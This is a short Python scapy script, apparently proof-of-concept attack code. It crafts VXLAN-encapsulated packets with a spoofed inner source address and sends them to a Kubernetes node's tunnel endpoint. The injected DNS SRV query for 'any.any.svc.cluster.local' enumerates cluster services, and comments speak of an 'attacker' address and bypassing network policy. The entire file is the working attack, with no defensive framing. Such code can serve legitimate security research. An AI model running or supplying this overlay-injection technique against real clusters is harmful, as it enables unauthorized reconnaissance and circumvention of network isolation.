import ipaddress

from scapy.layers.l2 import Ether
from scapy.layers.inet import IP,UDP
from scapy.layers.vxlan import VXLAN
from scapy.layers.dns import DNS,DNSQR
from scapy.sendrecv import sendp,srp1,sniff,AsyncSniffer

# outer packet
vxlanport=4789 # RFC 7348 port 4789, Linux kernel default 8472
vni=1 # default
nodemac="52:54:00:4E:BA:3E"
vtepsrc="10.123.0.138" # me
vtepdst="10.123.0.101" # target

randommac="52:54:00:01:02:03" # source MAC, doesnt matter?
broadcastmac="82:46:07:86:8e:b9" # dest node VTEP
attacker="10.123.0.138" # fix this to bypass netpol?, make this an internal address for not assymetric routing
destination="10.100.0.53"
dstport=53
srcport=55353

vxlan=Ether(dst=nodemac)/IP(src=vtepsrc,dst=vtepdst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")

#packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=srcport,dport=dstport)/DNS(rd=1,id=0xdead,qd=DNSQR(qname="kubernetes.default.svc.cluster.local"))
packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=srcport,dport=dstport)/DNS(rd=1,id=0xdead,qd=DNSQR(qname="any.any.svc.cluster.local",qtype="SRV"))
#packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst=destination)/UDP(sport=srcport,dport=dstport)/DNS(rd=1,id=0xdead,qd=DNSQR(qname="localhost"))

sniff = AsyncSniffer(filter=f"udp and port {srcport}", count=1)
sniff.start()

sendp(packet, loop=0)
# wait for packet
sniff.join()

pkt = sniff.results[0]
dns = pkt.getlayer(3)
for i in range(0,len(dns.an.layers())):
    rrsrv = dns.an.getlayer(i)
    name = rrsrv.target.decode().rstrip('.')
    print(f"{name}:{rrsrv.port}")




#srp1(packet, verbose=3)

#net = ipaddress.IPv4Network(f"{destination}/16",strict=False)

